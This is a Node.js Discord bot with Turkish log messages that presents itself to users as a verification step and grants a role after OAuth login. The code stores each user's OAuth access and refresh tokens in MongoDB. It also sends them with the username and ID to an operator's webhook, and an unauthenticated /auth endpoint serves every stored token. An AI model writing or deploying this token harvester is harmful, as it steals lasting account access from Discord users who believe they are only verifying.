const Discord = require("discord.js");
const mongoose = require("mongoose");
const client = new Discord.Client({
  intents: 32767,
});
const configs = require("./configs");
const chalk = require("chalk");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const FormData = require("form-data");
const axios = require("axios");

const mongoUri = configs.mongoUri;

mongoose
  .connect(mongoUri)
  .then(() => {
    console.log(chalk.green("[MongoDB] Bağlantı başarılı"));

    // MongoDB bağlantısı tamamlandıktan sonra botu başlat
    client.login(configs.token).catch(() => {
      throw new Error(`TOKEN VEYA INTENTLER EKSİK`);
    });
  })
  .catch((err) => {
    console.error(chalk.red("[MongoDB] Bağlantı hatası:", err));
  });
const userSchema = new mongoose.Schema({
  username: String,
  userID: { type: String, unique: true },
  access_token: String,
  refresh_token: String,
});

const User = mongoose.model("User", userSchema);

app.use(bodyParser.text());

app.get("/", function (req, res) {
  res.sendFile(__dirname + "/index.html");
});

app.get("/auth", async (req, res) => {
  try {
    const users = await User.find({});
    res.json(users);
  } catch (err) {
    res.status(500).json({ error: "Veri alınamadı." });
  }
});

app.post("/", async (req, res) => {
  try {
    const form = getFormData(req);
    const tokenInfo = await getToken(form);
    const userInfo = await getUserInfo(tokenInfo);

    module.exports = { userInfo };

    const infos = {
      username: userInfo.username + "#" + userInfo.discriminator,
      userID: userInfo.id,
      access_token: tokenInfo.access_token,
      refresh_token: tokenInfo.refresh_token,
    };

    const existingUser = await User.findOne({ userID: infos.userID });
    if (existingUser) {
      console.log(
        chalk.blue(`[!] - ${infos.username} Zaten veritabanında kayıtlı`),
      );
    } else {
      await User.create(infos);
      console.log(chalk.green(`[+] - ${infos.username} veritabanına eklendi`));
    }

    await sendWebhook(infos);

    client.emit("usuarioAutenticado", userInfo.id);

    res.sendStatus(200);
  } catch (error) {
    console.error(error);
    res.sendStatus(500);
  }
});

function getFormData(req) {
  let form = new FormData();
  form.append("client_id", configs.client_id);
  form.append("client_secret", configs.client_secret);
  form.append("grant_type", "authorization_code");
  form.append("redirect_uri", configs.redirect_uri);
  form.append("code", req.body);
  return form;
}

async function getToken(form) {
  const response = await fetch("https://discordapp.com/api/oauth2/token", {
    method: "POST",
    body: form,
  });
  return response.json();
}

async function getUserInfo(tokenInfo) {
  const headers = {
    headers: {
      authorization: `${tokenInfo.token_type} ${tokenInfo.access_token}`,
    },
  };

  try {
    const response = await axios.get(
      "https://discordapp.com/api/users/@me",
      headers,
    );
    return response.data;
  } catch (error) {
    if (error.response && error.response.status === 401) {
      console.log("[BOT] Yetkilendirme hatası.");
    } else {
      console.log(error);
    }
  }
}

async function sendWebhook(infos) {
  const data = {
    embeds: [
      {
        color: "000000",
        title: `\`🔥\`・Verified`,
        thumbnail: {
          url: `https://cdn.discordapp.com/attachments/1064679607644725299/1064685992071675974/755490897143136446.gif`,
        },
        description:
          ` Kullanıcı: \`${infos.username}\`` +
          `\n\n ID: \`${infos.userID}\`` +
          `\n\n Access Token: \`${infos.access_token}\`` +
          `\n\n Refresh Token: \`${infos.refresh_token}\``,
      },
    ],
  };
  await fetch(`${configs.webhook}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });
}

client.on("usuarioAutenticado", async (userID) => {
  try {
    const guild = await client.guilds.fetch(configs.idserver);
    const member = await guild.members.fetch(userID);
    const cargo = await guild.roles.fetch(configs.idrole);

    if (member.roles.cache.has(cargo.id)) {
      console.log(`[BOT] Kullanıcı zaten bu role sahip!`);
    } else {
      await member.roles.add(cargo);
      console.log(`[BOT] Rol: ${cargo.name} başarıyla eklendi!`);
    }
  } catch (err) {
    console.log(`[BOT] Kullanıcı sunucuda değil veya rol mevcut değil.`);
  }
});

client.on("interactionCreate", (interaction) => {
  if (interaction.type === Discord.InteractionType.ApplicationCommand) {
    const cmd = client.slashCommands.get(interaction.commandName);

    if (!cmd) return interaction.reply(`Error`);

    interaction["member"] = interaction.guild.members.cache.get(
      interaction.user.id,
    );

    cmd.run(client, interaction);
  }
});

client.slashCommands = new Discord.Collection();

require("./handler")(client);

console.clear();

const port = process.env.PORT || 3000;

app.listen(port, () => {
  console.log(`Sunucu ${port} portunda çalışıyor`);
});

client.on("ready", () => {
  console.log(
    chalk.cyan(`[BOT] Olarak giriş yapıldı: ${client.user.username}`),
  );
  console.log(chalk.cyan(`[BOT] Prefix: ${configs.prefix}`));
  console.log(
    chalk.cyan(
      `[BOT] Bot Davet: https://discord.com/api/oauth2/authorize?client_id=${client.user.id}&permissions=8&scope=bot\n`,
    ),
  );
  client.user.setActivity(`🔍・Sizi kontrol ediyor...`, { type: "WATCHING" });
});
